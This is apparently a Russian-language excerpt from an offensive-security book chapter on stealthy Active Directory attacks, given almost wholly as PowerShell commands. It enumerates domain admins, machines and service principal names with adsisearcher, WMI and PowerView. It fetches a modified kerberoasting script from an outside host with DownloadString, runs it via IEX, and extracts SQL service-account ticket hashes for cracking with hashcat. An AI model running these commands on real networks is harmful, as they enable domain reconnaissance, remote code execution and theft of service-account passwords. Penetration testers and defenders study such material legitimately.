### Глава 9 ###
# Камуфляж

# запрос копий объектов AD, таких как пользователи, группы, машины и настройки GPO с целью кэширования все машины в Лесу AD полагаются на LDAP.
$search=[adsisearcher]'(memberOf=CN=Domain Admins,CN=users,DC=Stratjumbo,DC=lan)'
$search.findAll()

# Если мы действительно настороженно относимся к любому типу взаимодействия с контроллером домена, мы можем дополнительно замаскироваться, 
# напрямую запрашивая кэшированные Windows объекты домена. Эти объекты предоставляются через классы WMI, такие как win32_groupindomain и Win32_UserAccount:
Get-WmiObject -class win32_groupindomain | select partcomponent
Get-WmiObject -Class Win32_UserAccount -Filter "Domain='stratjumbo' AND Disabled='False'"

# применяем PowerView для вызова Get-NetGroupMember чтобы опять перечислить этих администраторов домена:
Get-NetGroupMember -GroupName "domain admins"

# список объявленных в Active Directory машин:
Get-NetComputer -FullData |select cn, operatingsystem, logoncount, lastlogon |Format-Table -Wrap -AutoSize

# Выборка сведений о службах через SPN:
Get-NetUser | select name,serviceprincipalname | Format-Table -Wrap -AutoSize

# SPN, возможно, и обычные, связаны также и с учётными записями машин, а потому мы захватываем их при помощи команды Get-NetComputer:
Get-NetComputer -FullData -SPN * | select samaccountname,serviceprincipalname | Format-Table -Wrap -AutoSize

# Атакуем базу данных

# нам требуется объект браузера в своём окне PowerShell:
$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;

# Затем мы можем выгрузить свой видоизменённый сценарий:
$content = $browser.DownloadString("https://sf-res.com/kerberoast.ps1")
# & выполнив его: 
IEX($content);
		
# ограничивая свой поиск до SPN на удовлетворение условию *sql*. Мы сохраняем свои результаты в hash.txt в понимаемом hashcat формате
Invoke-Kerber -OutputFormat hashcat -LDAPFilter '(SamAccountName=*sql*)' | out-file hash.txt

# Ниже приводится команда для взлома этих паролей, где -m ссылается на алгоритм Kerberos 5 TGS-REP etype 23, а wordlist.txt это список вероятных претендентов на пароли:
hashcat64.exe -m 13100 hash.txt wordlist.txt